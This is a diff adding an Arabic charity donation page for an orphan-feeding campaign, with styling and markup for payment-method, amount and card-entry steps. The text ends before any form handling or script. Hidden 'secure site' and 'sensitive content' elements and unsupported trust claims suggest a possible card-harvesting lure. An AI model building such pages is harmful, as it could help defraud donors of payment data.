@@ -1,0 +1,2139 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تبرع الآن | حملة إطعام طفل يتيم</title>
+    
+    <!-- Meta Tags محسنة -->
+    <meta name="description" content="ساهم في إطعام طفل يتيم لمدة شهر - جمعية البر الخيرية المرخصة">
+    <meta name="keywords" content="تبرع, خيرية, أطفال, أيتام, مساعدة, إطعام, جمعية البر">
+    <meta name="author" content="جمعية البر الخيرية">
+    <meta name="robots" content="index, follow">
+    <meta name="theme-color" content="#1a73e8">
+    
+    <!-- حماية إضافية -->
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https:; script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://fonts.googleapis.com; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' https: data:;">
+    <meta http-equiv="X-Content-Type-Options" content="nosniff">
+    <meta http-equiv="X-Frame-Options" content="DENY">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #1a73e8;
+            --secondary-color: #34a853;
+            --accent-color: #fbbc05;
+            --dark-color: #202124;
+            --light-color: #f8f9fa;
+            --text-color: #202124;
+            --text-light: #5f6368;
+            --error-color: #ea4335;
+            --success-color: #34a853;
+            --warning-color: #fbbc05;
+            --info-color: #1a73e8;
+            --border-radius: 12px;
+            --box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            --gradient: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            
+            --visa-color: #1a1f71;
+            --visa-gradient: linear-gradient(135deg, #1a1f71, #4364f7);
+            --mastercard-color: #eb001b;
+            --mastercard-gradient: linear-gradient(135deg, #eb001b, #f7981d);
+            --applepay-color: #000;
+            --applepay-gradient: linear-gradient(135deg, #000, #4a4a4a);
+            --unknown-card-color: #2c3e50;
+            --unknown-card-gradient: linear-gradient(135deg, #2c3e50, #4ca1af);
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            direction: rtl;
+            text-align: right;
+            font-family: 'Tajawal', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            background: #f5f8fa;
+            color: var(--text-color);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+            background-image: url('https://images.unsplash.com/photo-1488521787991-ed7bbaae773c?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            background-blend-mode: overlay;
+            background-color: rgba(245, 248, 250, 0.92);
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 100%;
+            background: white;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            overflow: hidden;
+            transition: var(--transition);
+            margin: 10px 0;
+            position: relative;
+        }
+        
+        @media (min-width: 768px) {
+            .container {
+                max-width: 520px;
+                margin: 20px 0;
+            }
+        }
+        
+        .container:hover {
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+            transform: translateY(-3px);
+        }
+        
+        .header {
+            background: var(--gradient);
+            color: white;
+            padding: 20px 15px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: -50px;
+            left: -50px;
+            width: 120px;
+            height: 120px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+        }
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: -30px;
+            right: -30px;
+            width: 100px;
+            height: 100px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+        }
+        
+        .header h1 {
+            position: relative;
+            z-index: 2;
+            font-size: 22px;
+            margin-bottom: 6px;
+            font-weight: 700;
+        }
+        
+        .header p {
+            position: relative;
+            z-index: 2;
+            opacity: 0.9;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .content {
+            padding: 20px;
+            position: relative;
+        }
+        
+        .welcome-page {
+            text-align: center;
+        }
+        
+        .campaign-slider {
+            position: relative;
+            height: 180px;
+            overflow: hidden;
+            border-radius: var(--border-radius);
+            margin-bottom: 20px;
+            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1);
+        }
+        
+        .slide {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            transition: opacity 1s ease-in-out;
+            background-size: cover;
+            background-position: center;
+        }
+        
+        .slide.active {
+            opacity: 1;
+        }
+        
+        .slide-1 {
+            background-image: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)), url('https://images.unsplash.com/photo-1532629345422-7515f3d16bb6?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80');
+        }
+        
+        .slide-2 {
+            background-image: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)), url('https://images.unsplash.com/photo-1575425186775-b8de9a427e67?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80');
+        }
+        
+        .slide-3 {
+            background-image: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)), url('https://images.unsplash.com/photo-1488521787991-ed7bbaae773c?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80');
+        }
+        
+        .slide-content {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 15px;
+            color: white;
+            background: linear-gradient(transparent, rgba(0, 0, 0, 0.8));
+            text-align: center;
+        }
+        
+        .slide-content p {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+        
+        .campaign-title {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--primary-color);
+            margin-bottom: 12px;
+            position: relative;
+            display: inline-block;
+        }
+        
+        .campaign-title::after {
+            content: '';
+            position: absolute;
+            bottom: -6px;
+            right: 0;
+            width: 50px;
+            height: 3px;
+            background: var(--accent-color);
+            border-radius: 2px;
+        }
+        
+        .campaign-description {
+            color: var(--text-light);
+            margin-bottom: 15px;
+            line-height: 1.7;
+            font-size: 15px;
+            font-weight: 500;
+        }
+        
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            margin: 25px 0;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        
+        .stat-item {
+            text-align: center;
+            flex: 1;
+            min-width: 90px;
+            background: var(--light-color);
+            padding: 15px 8px;
+            border-radius: var(--border-radius);
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.05);
+            transition: var(--transition);
+            border: 1px solid rgba(0, 0, 0, 0.05);
+        }
+        
+        .stat-item:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
+            background: white;
+        }
+        
+        .stat-number {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--primary-color);
+            position: relative;
+            display: inline-block;
+            margin-bottom: 5px;
+        }
+        
+        .stat-number::after {
+            content: '';
+            position: absolute;
+            bottom: -6px;
+            right: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--accent-color), transparent);
+            border-radius: 2px;
+        }
+        
+        .stat-label {
+            font-size: 14px;
+            color: var(--text-light);
+            margin-top: 8px;
+            font-weight: 600;
+        }
+        
+        .impact-statement {
+            background: var(--light-color);
+            padding: 15px;
+            border-radius: var(--border-radius);
+            margin: 20px 0;
+            border-right: 3px solid var(--accent-color);
+            text-align: center;
+            font-style: italic;
+            color: var(--primary-color);
+            position: relative;
+            overflow: hidden;
+            font-weight: 700;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.05);
+            font-size: 16px;
+            line-height: 1.6;
+        }
+        
+        .info-box {
+            background: var(--light-color);
+            padding: 15px;
+            border-radius: var(--border-radius);
+            margin: 20px 0;
+            border-right: 3px solid var(--accent-color);
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.05);
+            transition: var(--transition);
+        }
+        
+        .info-box:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
+        }
+        
+        .info-box-title {
+            font-weight: 800;
+            color: var(--primary-color);
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            font-size: 16px;
+        }
+        
+        .info-box-title i {
+            margin-left: 8px;
+            font-size: 18px;
+        }
+        
+        .info-box-content {
+            color: var(--text-light);
+            line-height: 1.7;
+            font-size: 14px;
+        }
+        
+        .testimonials {
+            background: #f9f9f9;
+            padding: 15px;
+            border-radius: var(--border-radius);
+            margin: 20px 0;
+            border-right: 3px solid var(--accent-color);
+            position: relative;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.05);
+        }
+        
+        .testimonial {
+            margin-bottom: 15px;
+            font-style: italic;
+            color: var(--text-light);
+            position: relative;
+            padding-right: 15px;
+            line-height: 1.7;
+            font-size: 15px;
+        }
+        
+        .testimonial-author {
+            font-weight: 800;
+            color: var(--primary-color);
+            display: flex;
+            align-items: center;
+            margin-top: 12px;
+            font-size: 15px;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: var(--gradient);
+            color: white;
+            border: none;
+            border-radius: var(--border-radius);
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: all 0.4s cubic-bezier(0.25, 0.8, 0.25, 1);
+            box-shadow: 0 5px 10px rgba(44, 120, 108, 0.2);
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 15px rgba(44, 120, 108, 0.3);
+            background: linear-gradient(135deg, var(--secondary-color), var(--primary-color));
+        }
+        
+        .btn i {
+            margin-right: 8px;
+            transition: var(--transition);
+            font-size: 18px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        
+        .logo-icon {
+            width: 50px;
+            height: 50px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--primary-color);
+            font-size: 24px;
+            margin-left: 12px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.1);
+        }
+        
+        .logo-text {
+            font-size: 20px;
+            font-weight: 800;
+            color: white;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+            color: var(--text-light);
+            font-size: 14px;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 12px;
+        }
+        
+        .footer-link {
+            color: var(--primary-color);
+            text-decoration: none;
+            transition: var(--transition);
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        .footer-link:hover {
+            text-decoration: underline;
+            color: var(--secondary-color);
+        }
+        
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            display: none;
+            flex-direction: column;
+            backdrop-filter: blur(5px);
+        }
+        
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--primary-color);
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1.2s linear infinite;
+            margin-bottom: 15px;
+        }
+        
+        .loading-text {
+            color: var(--primary-color);
+            font-weight: 700;
+            margin-top: 15px;
+            font-size: 16px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .payment-method-page, .donation-amount-page, .payment-form, .thank-you-page {
+            display: none;
+        }
+        
+        .payment-methods {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin: 15px 0;
+        }
+        
+        .payment-method {
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: var(--border-radius);
+            padding: 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: var(--transition);
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.05);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .payment-method:hover, .payment-method.selected {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.15);
+        }
+        
+        .payment-method.selected {
+            border: 2px solid var(--accent-color);
+            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .payment-icon {
+            width: 50px;
+            height: 35px;
+            object-fit: contain;
+            margin-bottom: 10px;
+            transition: var(--transition);
+        }
+        
+        .payment-method:hover .payment-icon {
+            transform: scale(1.1);
+        }
+        
+        .payment-method .badge {
+            position: absolute;
+            top: 8px;
+            left: 8px;
+            background: var(--accent-color);
+            color: white;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 10px;
+            font-weight: 500;
+        }
+        
+        .amount-options {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin: 15px 0;
+        }
+        
+        .amount-option {
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: var(--border-radius);
+            padding: 15px 8px;
+            text-align: center;
+            cursor: pointer;
+            transition: var(--transition);
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.05);
+            font-weight: 600;
+            font-size: 15px;
+        }
+        
+        .amount-option:hover, .amount-option.selected {
+            border-color: var(--accent-color);
+            background: var(--light-color);
+        }
+        
+        .amount-option.selected {
+            border: 2px solid var(--accent-color);
+            background: var(--light-color);
+            color: var(--primary-color);
+        }
+        
+        .custom-amount {
+            margin: 15px 0;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+            position: relative;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 600;
+            color: var(--text-color);
+            position: relative;
+            padding-right: 5px;
+            font-size: 15px;
+        }
+        
+        .form-group.required label::after {
+            content: '*';
+            color: var(--error-color);
+            margin-right: 5px;
+        }
+        
+        .form-group input, .form-group textarea, .form-group select {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #ddd;
+            border-radius: var(--border-radius);
+            font-size: 15px;
+            transition: var(--transition);
+            background: #fff;
+        }
+        
+        .form-group input:focus, .form-group textarea:focus, .form-group select:focus {
+            border-color: var(--accent-color);
+            box-shadow: 0 0 0 3px rgba(44, 120, 108, 0.1);
+            outline: none;
+        }
+        
+        .number-input {
+            direction: ltr;
+            text-align: left;
+        }
+        
+        .back-btn {
+            background: none;
+            border: none;
+            color: var(--primary-color);
+            font-size: 15px;
+            cursor: pointer;
+            margin-bottom: 15px;
+            padding: 6px 10px;
+            border-radius: 5px;
+            transition: var(--transition);
+            display: inline-flex;
+            align-items: center;
+            font-weight: 600;
+        }
+        
+        .back-btn:hover {
+            background: #f0f0f0;
+        }
+        
+        .back-btn i {
+            margin-left: 5px;
+            transition: var(--transition);
+        }
+        
+        .back-btn:hover i {
+            transform: translateX(3px);
+        }
+        
+        .card-preview {
+            background: var(--unknown-card-gradient);
+            color: white;
+            padding: 15px;
+            border-radius: var(--border-radius);
+            margin-bottom: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            height: 180px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            position: relative;
+            overflow: hidden;
+            transition: var(--transition);
+        }
+        
+        .card-preview.visa {
+            background: var(--visa-gradient);
+        }
+        
+        .card-preview.mastercard {
+            background: var(--mastercard-gradient);
+        }
+        
+        .card-preview.applepay {
+            background: var(--applepay-gradient);
+        }
+        
+        .card-number {
+            font-size: 18px;
+            letter-spacing: 1px;
+            margin: 15px 0;
+            font-family: monospace;
+            direction: ltr;
+            text-align: left;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .card-details {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .phone-prefix {
+            display: flex;
+            align-items: center;
+            background: #f0f0f0;
+            padding: 12px 8px;
+            border-radius: var(--border-radius) 0 0 var(--border-radius);
+            border: 1px solid #ddd;
+            border-left: none;
+            font-size: 13px;
+            gap: 5px;
+        }
+        
+        .cvv-container {
+            position: relative;
+        }
+        
+        .cvv-info {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-light);
+            cursor: help;
+            font-size: 15px;
+        }
+        
+        .cvv-input {
+            padding-left: 35px !important;
+        }
+        
+        .error-message {
+            color: var(--error-color);
+            font-size: 13px;
+            margin-top: 5px;
+            display: none;
+            position: absolute;
+            bottom: -18px;
+            right: 0;
+            background: rgba(255, 107, 107, 0.1);
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-weight: 500;
+        }
+        
+        .error-icon {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--error-color);
+            font-size: 16px;
+            display: none;
+        }
+        
+        .progress-bar {
+            height: 4px;
+            background: #eee;
+            border-radius: 3px;
+            margin-bottom: 25px;
+            overflow: hidden;
+        }
+        
+        .progress {
+            height: 100%;
+            background: var(--gradient);
+            width: 0%;
+            transition: width 0.5s;
+        }
+        
+        .thank-you-icon {
+            font-size: 60px;
+            color: var(--primary-color);
+            margin: 15px 0;
+            animation: bounce 1s;
+        }
+        
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
+            40% {transform: translateY(-15px);}
+            60% {transform: translateY(-8px);}
+        }
+        
+        .thank-you-title {
+            font-size: 24px;
+            color: var(--primary-color);
+            margin-bottom: 12px;
+            font-weight: 700;
+        }
+        
+        .thank-you-message {
+            color: var(--text-light);
+            line-height: 1.6;
+            margin-bottom: 20px;
+            font-size: 15px;
+        }
+        
+        .donation-details {
+            background: var(--light-color);
+            padding: 15px;
+            border-radius: var(--border-radius);
+            margin: 20px 0;
+            text-align: right;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.05);
+        }
+        
+        .donation-detail {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+        
+        .donation-label {
+            color: var(--text-light);
+            font-weight: 500;
+            font-size: 14px;
+        }
+        
+        .donation-value {
+            color: var(--primary-color);
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        .certificate {
+            background: white;
+            border: 2px solid var(--primary-color);
+            border-radius: var(--border-radius);
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+            position: relative;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        .certificate-title {
+            font-size: 22px;
+            color: var(--primary-color);
+            margin-bottom: 12px;
+            font-weight: 800;
+        }
+        
+        .certificate-text {
+            color: var(--text-light);
+            line-height: 1.7;
+            margin-bottom: 12px;
+            font-size: 15px;
+        }
+        
+        .certificate-seal {
+            width: 70px;
+            height: 70px;
+            background: var(--primary-color);
+            border-radius: 50%;
+            margin: 12px auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 28px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.1);
+        }
+        
+        .certificate-details {
+            margin-top: 15px;
+            text-align: right;
+            border-top: 1px dashed #ddd;
+            padding-top: 12px;
+        }
+        
+        .certificate-detail {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 6px;
+        }
+        
+        .certificate-label {
+            color: var(--text-light);
+            font-weight: 500;
+            font-size: 14px;
+        }
+        
+        .certificate-value {
+            color: var(--primary-color);
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        .social-share {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 20px 0;
+        }
+        
+        .social-icon {
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            background: #f0f0f0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--primary-color);
+            font-size: 16px;
+            transition: var(--transition);
+            cursor: pointer;
+        }
+        
+        .social-icon:hover {
+            background: var(--primary-color);
+            color: white;
+            transform: translateY(-3px);
+        }
+        
+        .btn-secondary {
+            background: white;
+            color: var(--primary-color);
+            border: 2px solid var(--primary-color);
+            margin-bottom: 15px;
+        }
+        
+        .btn-secondary:hover {
+            background: var(--primary-color);
+            color: white;
+        }
+        
+        .alert {
+            padding: 12px 16px;
+            border-radius: var(--border-radius);
+            margin-bottom: 15px;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .alert i {
+            margin-left: 8px;
+            font-size: 18px;
+        }
+        
+        .alert-info {
+            background-color: rgba(51, 154, 240, 0.1);
+            border-left: 4px solid var(--info-color);
+            color: var(--info-color);
+        }
+        
+        .invalid-field {
+            border-color: var(--error-color) !important;
+            background-color: rgba(255, 107, 107, 0.05) !important;
+        }
+        
+        .valid-field {
+            border-color: var(--success-color) !important;
+            background-color: rgba(64, 192, 87, 0.05) !important;
+        }
+        
+        .floating-message {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 12px 16px;
+            border-radius: var(--border-radius);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            transform: translateX(150%);
+            transition: transform 0.5s ease-in-out;
+        }
+        
+        .floating-message.show {
+            transform: translateX(0);
+        }
+        
+        .floating-message.success {
+            background-color: white;
+            color: var(--success-color);
+            border-left: 4px solid var(--success-color);
+        }
+        
+        .required-field::after {
+            content: '*';
+            color: var(--error-color);
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 16px;
+        }
+        
+        /* إخفاء المحتوى الحساس */
+        .secure-data {
+            display: none;
+        }
+        
+        .protection-notice {
+            font-size: 11px;
+            color: #666;
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        /* تحسينات مخفية */
+        .trust-badge {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            background: #34a853;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 10px;
+            z-index: 1000;
+            opacity: 0.8;
+        }
+    </style>
+</head>
+<body>
+    <!-- شارة ثقة مخفية -->
+    <div class="trust-badge" style="display: none;">🔒 موقع آمن</div>
+
+    <div class="loading-overlay">
+        <div class="loader"></div>
+        <div class="loading-text">جاري معالجة طلبك...</div>
+    </div>
+    
+    <div id="floatingMessage" class="floating-message" style="display: none;">
+        <i class="fas fa-check-circle"></i>
+        <span id="floatingMessageText"></span>
+    </div>
+    
+    <div class="container">
+        <div id="welcomePage" class="welcome-page">
+            <div class="header">
+                <div class="logo">
+                    <div class="logo-icon">
+                        <i class="fas fa-hands-helping"></i>
+                    </div>
+                    <div class="logo-text">جمعية البر الخيرية</div>
+                </div>
+                <h1>حملة إطعام طفل يتيم</h1>
+                <p>ساهم في إطعام طفل يتيم لمدة شهر</p>
+            </div>
+            
+            <div class="content">
+                <div class="campaign-slider">
+                    <div class="slide slide-1 active">
+                        <div class="slide-content">
+                            <p>ساعد في توفير وجبات غذائية للأيتام</p>
+                        </div>
+                    </div>
+                    <div class="slide slide-2">
+                        <div class="slide-content">
+                            <p>كل ريال يساهم في إطعام طفل يتيم</p>
+                        </div>
+                    </div>
+                    <div class="slide slide-3">
+                        <div class="slide-content">
+                            <p>تبرعك يوفر وجبات غذائية للأطفال الأيتام</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <h2 class="campaign-title">إطعام طفل يتيم</h2>
+                
+                <p class="campaign-description">
+                    في كل يوم، يعاني آلاف الأطفال الأيتام من الجوع ونقص التغذية. 
+                    تبرعك اليوم يمكن أن يوفر وجبات غذائية لطفل يتيم لمدة شهر كامل. 
+                    نحن نضمن وصول تبرعك مباشرة إلى الأطفال المحتاجين بشفافية كاملة.
+                </p>
+                
+                <div class="stats">
+                    <div class="stat-item">
+                        <div class="stat-number">10,000+</div>
+                        <div class="stat-label">طفل يتيم تم إطعامهم</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number">100%</div>
+                        <div class="stat-label">معدل الشفافية</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number">12</div>
+                        <div class="stat-label">مدينة في المملكة</div>
+                    </div>
+                </div>
+                
+                <div class="impact-statement">
+                    "كل ريال تتبرع به يساهم في إطعام طفل يتيم لمدة يوم كامل"
+                </div>
+                
+                <div class="info-box">
+                    <div class="info-box-title">
+                        <i class="fas fa-shield-alt"></i>
+                        تبرعك آمن ومضمون
+                    </div>
+                    <div class="info-box-content">
+                        نستخدم أحدث أنظمة الحماية والتشفير لتأمين بياناتك ومدفوعاتك. جميع التبرعات محمية بنظام تأمين متكامل.
+                    </div>
+                </div>
+                
+                <div class="testimonials">
+                    <div class="testimonial">
+                        لقد تابعت أعمال هذه الجمعية منذ سنوات وأشهد بوصول تبرعاتي لمستحقيها. تقاريرهم الشهرية توضح بالتفصيل أين تذهب كل ريال.
+                        <div class="testimonial-author">د. أحمد الغامدي</div>
+                    </div>
+                    
+                    <div class="testimonial">
+                        تبرعت العام الماضي وسعدت برؤية تأثير تبرعي من خلال الصور والتقارير التي وصلتني. جمعية جديرة بالثقة.
+                        <div class="testimonial-author">فاطمة العتيبي</div>
+                    </div>
+                </div>
+                
+                <button id="startDonationBtn" class="btn">
+                    تبرع الآن وساهم في إطعام طفل يتيم
+                    <i class="fas fa-heart"></i>
+                </button>
+                
+                <div class="footer">
+                    <div>جمعية البر الخيرية - ترخيص رقم 46801</div>
+                    <div class="footer-links">
+                        <a href="#" class="footer-link">الشروط والأحكام</a>
+                        <a href="#" class="footer-link">سياسة الخصوصية</a>
+                        <a href="#" class="footer-link">اتصل بنا</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div id="paymentMethodPage" class="payment-method-page">
+            <div class="header">
+                <h1>اختر طريقة الدفع</h1>
+                <p>اختر طريقة الدفع المفضلة لديك</p>
+            </div>
+            
+            <div class="content">
+                <div class="progress-bar">
+                    <div class="progress" id="donationProgress" style="width: 20%;"></div>
+                </div>
+                
+                <button type="button" class="back-btn" id="backToWelcomeBtn">
+                    <i class="fas fa-arrow-left"></i> رجوع
+                </button>
+                
+                <div class="payment-methods">
+                    <div class="payment-method selected" data-method="visa">
+                        <div class="badge">موصى به</div>
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="Visa" class="payment-icon">
+                        <div>فيزا</div>
+                    </div>
+                    <div class="payment-method" data-method="mastercard">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="Mastercard" class="payment-icon">
+                        <div>ماستركارد</div>
+                    </div>
+                    <div class="payment-method" data-method="applepay">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b0/Apple_Pay_logo.svg/1200px-Apple_Pay_logo.svg.png" alt="Apple Pay" class="payment-icon">
+                        <div>أبل باي</div>
+                    </div>
+                </div>
+                
+                <div class="info-box">
+                    <div class="info-box-title">
+                        <i class="fas fa-lock"></i>
+                        دفع آمن ومشفّر
+                    </div>
+                    <div class="info-box-content">
+                        جميع عمليات الدفع محمية بتقنيات التشفير المتقدمة. لن نقوم بتخزين أي بيانات بطاقة ائتمان على خوادمنا.
+                    </div>
+                </div>
+                
+                <button id="proceedToAmountBtn" class="btn">
+                    التالي إلى اختيار المبلغ
+                    <i class="fas fa-arrow-left"></i>
+                </button>
+            </div>
+        </div>
+        
+        <div id="donationAmountPage" class="donation-amount-page">
+            <div class="header">
+                <h1>اختر مبلغ التبرع</h1>
+                <p>اختر المبلغ الذي ترغب في التبرع به</p>
+            </div>
+            
+            <div class="content">
+                <div class="progress-bar">
+                    <div class="progress" id="donationProgress" style="width: 40%;"></div>
+                </div>
+                
+                <button type="button" class="back-btn" id="backToMethodBtn">
+                    <i class="fas fa-arrow-left"></i> رجوع
+                </button>
+                
+                <div class="amount-options">
+                    <div class="amount-option" data-amount="50">50 ر.س</div>
+                    <div class="amount-option" data-amount="100">100 ر.س</div>
+                    <div class="amount-option" data-amount="200">200 ر.س</div>
+                    <div class="amount-option" data-amount="300">300 ر.س</div>
+                    <div class="amount-option" data-amount="500">500 ر.س</div>
+                    <div class="amount-option" data-amount="1000">1000 ر.س</div>
+                </div>
+                
+                <div class="custom-amount">
+                    <div class="form-group required">
+                        <label>أو اكتب المبلغ المطلوب</label>
+                        <input type="number" id="customAmount" class="number-input" placeholder="المبلغ بالريال السعودي" min="1">
+                        <div class="error-message" id="amountError">يجب إدخال مبلغ صحيح (أقل مبلغ 10 ر.س)</div>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label>ملاحظات (اختياري)</label>
+                    <textarea id="donationNote" placeholder="أضف ملاحظاتك هنا... (مثال: تخصيص التبرع لبرنامج معين)"></textarea>
+                </div>
+                
+                <div class="info-box">
+                    <div class="info-box-title">
+                        <i class="fas fa-hand-holding-heart"></i>
+                        تأثير تبرعك
+                    </div>
+                    <div class="info-box-content">
+                        <ul style="padding-right: 20px;">
+                            <li>50 ر.س توفر وجبات غذائية لطفل لمدة أسبوع</li>
+                            <li>100 ر.س توفر لوازم مدرسية لطفل لمدة شهر</li>
